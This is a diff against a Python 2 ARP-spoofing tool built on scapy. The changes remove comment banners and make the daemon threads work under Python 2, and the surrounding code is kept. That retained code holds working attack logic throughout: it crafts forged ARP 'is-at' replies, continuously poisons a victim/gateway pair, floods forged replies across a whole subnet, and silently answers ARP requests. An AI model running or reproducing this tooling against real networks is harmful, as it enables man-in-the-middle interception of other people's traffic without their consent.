@@ -12,12 +12,10 @@ flood  : broadcast forged replies for every IP inside a CIDR
 Run “sudo python2 arp.py -h” for full CLI help and example commands.
 """
 
-# ---------------------------------------------------------------------------#
-#  Imports & global logging
-# ---------------------------------------------------------------------------#
+
 import logging, signal, threading, time
 try:
-    import ipaddress              # back-port for Py-2
+    import ipaddress    
 except ImportError:
     raise SystemExit(
         "Install the ipaddress back-port first:  sudo pip2 install ipaddress")
@@ -32,18 +30,13 @@ from scapy.all import (
 logging.basicConfig(format='[%(levelname).1s] %(message)s', level=logging.INFO)
 log = logging.getLogger('arp')
 
-# ---------------------------------------------------------------------------#
-#  Small Py-2 helper – convert str  ➜  unicode for ipaddress
-# ---------------------------------------------------------------------------#
+
 def _u(s):
     try:
-        return unicode(s)          # noqa: F821  (undefined on Py-3)
+        return unicode(s) 
     except NameError:
         return s
 
-# ---------------------------------------------------------------------------#
-#  Craft one forged “is-at” reply
-# ---------------------------------------------------------------------------#
 def craft(is_at_mac, dst_ip, dst_mac, src_ip):
     return (
         Ether(src=is_at_mac, dst=dst_mac) /
@@ -56,13 +49,11 @@ def resolve_mac(ip):
         raise RuntimeError("Could not resolve MAC for %s – host down?" % ip)
     return mac
 
-# ---------------------------------------------------------------------------#
-#  Spoofer thread classes
-# ---------------------------------------------------------------------------#
 class ActivePairSpoofer(threading.Thread):
     """Periodic two-way poisoning of one <victim, gateway> pair."""
     def __init__(self, iface, victim, gateway, att_mac, interval=10.0):
-        threading.Thread.__init__(self, daemon=True)
+        threading.Thread.__init__(self)
+        self.daemon = True   
         self.iface, self.victim, self.gateway = iface, victim, gateway
         self.att_mac, self.sleep, self._run = att_mac, interval, True
 
@@ -98,7 +89,8 @@ class ActivePairSpoofer(threading.Thread):
 class FloodSpoofer(threading.Thread):
     """Broadcast forged replies for *every* IP in a CIDR."""
     def __init__(self, iface, cidr, gw_ip, att_mac, interval=10.0):
-        threading.Thread.__init__(self, daemon=True)
+        threading.Thread.__init__(self)
+        self.daemon = True   
         self.iface = iface
         self.cidr  = ipaddress.ip_network(_u(cidr), strict=False)
         self.gw_ip, self.att_mac, self.sleep, self._run = gw_ip, att_mac, interval, True
@@ -119,7 +111,8 @@ class FloodSpoofer(threading.Thread):
 class SilentResponder(threading.Thread):
     """Only answers ARP who-has for victim / gateway."""
     def __init__(self, iface, victim, gateway, att_mac):
-        threading.Thread.__init__(self, daemon=True)
+        threading.Thread.__init__(self)
+        self.daemon = True   
         self.iface, self.victim, self.gateway, self.att_mac = iface, victim, gateway, att_mac
         self._run = True
 
@@ -143,9 +136,7 @@ class SilentResponder(threading.Thread):
               stop_filter=lambda *_: not self._run)
     def stop(self): self._run = False
 
-# ---------------------------------------------------------------------------#
-#  CLI and orchestration
-# ---------------------------------------------------------------------------#
+
 class PoisonManager(object):
     def __init__(self): self.thr = []
     def add(self, t): self.thr.append(t); t.start()
